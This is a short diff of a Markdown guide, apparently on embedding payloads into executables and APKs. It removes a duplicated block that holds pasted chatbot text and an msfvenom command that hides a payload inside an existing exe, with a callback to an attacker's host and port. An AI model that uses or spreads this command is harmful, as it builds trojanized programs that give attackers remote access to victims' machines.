@@ -29,15 +29,7 @@ You can embed a payload into an exe file using the following steps:
 
 Replace [existing_exe] with the path to the existing exe file.
 
-# Certainly! Here's the Markdown code for your .md file:
 
-markdown
-
-
-
-`msfvenom -x [existing_exe] -k -p [payload] LHOST=[your_IP] LPORT=[port] -o [output_filename]`
-
-Replace [existing_exe] with the path to the existing exe file.
 
 # Embedding into Android Application (APK)
 
